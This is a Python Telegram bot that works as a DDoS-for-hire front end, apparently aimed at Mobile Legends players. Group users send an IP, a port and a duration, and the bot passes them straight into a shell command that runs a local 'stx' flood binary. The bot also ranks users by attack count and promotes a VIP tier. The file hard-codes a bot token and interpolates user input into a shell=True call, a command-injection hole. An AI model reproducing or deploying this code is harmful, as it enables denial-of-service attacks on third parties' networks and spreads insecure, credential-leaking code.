#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
from telebot import types

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('7604295709:AAEw2BPJqgAAn-X1hxQlqklljtcsQydTg9E')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002272089718"
CHANNEL_USERNAME = "@DDOSMLBB", "@DDOSMLBB666"
SCREENSHOT_CHANNEL = "@DDOSMLBB", "@DDOSMLBB666"
ADMINS = [7316824198]

# GLOBAL VARIABLES
is_attack_running = False
attack_end_time = None
pending_feedback = {}
warn_count = {}
attack_logs = []
user_attack_count = {}

# FUNCTION TO CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        for channel in CHANNEL_USERNAME:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False  # Agar kisi bhi channel me nahi hai toh False
        return True  # Dono channels me hai toh True
    except:
        return False

# SCREENSHOT VERIFICATION FUNCTION
def verify_screenshot(user_id, message):
    if user_id in pending_feedback:
        for channel in SCREENSHOT_CHANNEL:
            bot.forward_message(channel, message.chat.id, message.message_id)  # Screenshot dono channels me bhej raha hai
            bot.send_message(channel, f"📸 **𝗨𝗦𝗘𝗥 `{user_id}` 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!** ✅")
        
        bot.reply_to(message, "✅ 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!. 🚀")
        del pending_feedback[user_id]  
    else:
        bot.reply_to(message, "❌❌❌ DENIED!")

# HANDLE ATTACK COMMAND
@bot.message_handler(commands=['stx'])
def handle_attack(message):
    global is_attack_running, attack_end_time
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 JUST ON @FREEDDOSMLBB ! ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❌ JOIN CHANNEL FIRST ! @DDOSMLBB AND @DDOSMLBB666")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "FEEDBACK FIRST ! 😡")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ ON GOING ATTACK /check ")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️USAGE: /stx <TIME> <IP> <PORT>")
        return

    time_duration, target, port = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT FORMAT NUMBER!")
        return

    if time_duration > 240:
        bot.reply_to(message, "🚫 240𝙎 MAX! VIP UP TO 360𝙎")
        return

    confirm_msg = f"🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:\n🎯 𝗧𝗔𝗥𝗚𝗘𝗧: `{target}`\n🔢 𝗣𝗢𝗥𝗧: `{port}`\n⏳ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡: `{time_duration}S`\n𝗦𝗧𝗔𝗧𝗨𝗦: `ON GOING...`\n📸 SEND FEEDBACK!"

    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")

    # PIN ATTACK STATUS
    bot.pin_chat_message(message.chat.id, message.message_id)

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
    pending_feedback[user_id] = True  

    bot.send_message(message.chat.id, f"🚀 𝗔𝗧𝗧𝗔𝗖𝗞 !\n🎯 `{target}:{port}`\n⏳ {time_duration}S\nFEEDBACK FIRST !", parse_mode="Markdown")

    # Attack Execution
    try:
        subprocess.run(f"./stx 10 {time_duration} {target} {port}", shell=True, check=True, timeout=time_duration)
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "✅ RUNNING AN ATTACK ! 🚨")
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟 !")
    finally:
        is_attack_running = False
        attack_end_time = None  
        bot.send_message(message.chat.id, "✅ DONE ATTACK! 🎯\n📸 SEND SCREENSHOT TO ANOTHER COMMAND!")

        # UNPIN ATTACK STATUS
        bot.unpin_chat_message(message.chat.id)

        # ATTACK LOGS
        attack_logs.append(f"{user_id} -> {target}:{port} ({time_duration}s)")
        user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1

# AUTO ANNOUNCEMENT SYSTEM
def auto_announcement():
    while True:
        time.sleep(18000)  # 1 HOURS
        bot.send_message(GROUP_ID, "📢 **𝗨𝗣𝗗𝗔𝗧𝗘:** THIS GROUP FOR TRIAL DDOS!! 🚀")

# HANDLE SCREENSHOT SUBMISSION
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id
    verify_screenshot(user_id, message)

# ADMIN RESTART COMMAND (ONLY ADMINS)
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ 𝗕𝗢𝗧 𝗥𝗘𝗦𝗧𝗔𝗥𝗧...")
        time.sleep(2)
        subprocess.run("python3 free.py", shell=True)
    else:
        bot.reply_to(message, "🚫 ERROR !")
        
@bot.message_handler(commands=['permit'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️PERMIT")
        time.sleep(2)
        subprocess.run("sudo chmod +x stx", shell=True)
    else:
        bot.reply_to(message, "🚫 ERROR !")
        

# HANDLE CHECK COMMAND
@bot.message_handler(commands=['check'])
def check_status(message):
    if is_attack_running:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(message, f"✅ **ON GOING ATTACK!**\n⏳ **REMAINING TIME:** {int(remaining_time)}S")
    else:
        bot.reply_to(message, "✅ DDOS READY")

# ATTACK STATS SYSTEM
@bot.message_handler(commands=['stats'])
def attack_stats(message):
    stats_msg = "📊 **ATTACK STATS:**\n\n"
    for user, count in user_attack_count.items():
        stats_msg += f"👤 `{user}` ➝ {count} ATTACKS 🚀\n"
    bot.send_message(message.chat.id, stats_msg, parse_mode="Markdown")

# HANDLE WARN SYSTEM
@bot.message_handler(commands=['warn'])
def warn_user(message):
    if message.from_user.id not in ADMINS:
        return

    if not message.reply_to_message:
        bot.reply_to(message, "❌ WARNING BY ADMIN!")
        return

    user_id = message.reply_to_message.from_user.id
    warn_count[user_id] = warn_count.get(user_id, 0) + 1

    if warn_count[user_id] >= 3:
        bot.kick_chat_member(GROUP_ID, user_id)
        bot.send_message(GROUP_ID, f"🚫 **𝗨𝗦𝗘𝗥𝗦 {user_id} 3 WARNING BANNED!**")
    else:
        bot.send_message(GROUP_ID, f"⚠️ **𝗨𝗦𝗘𝗥𝗦 {user_id} {warn_count[user_id]}/𝟯 WARNING!**")

# START POLLING
threading.Thread(target=auto_announcement).start()
bot.polling(none_stop=True)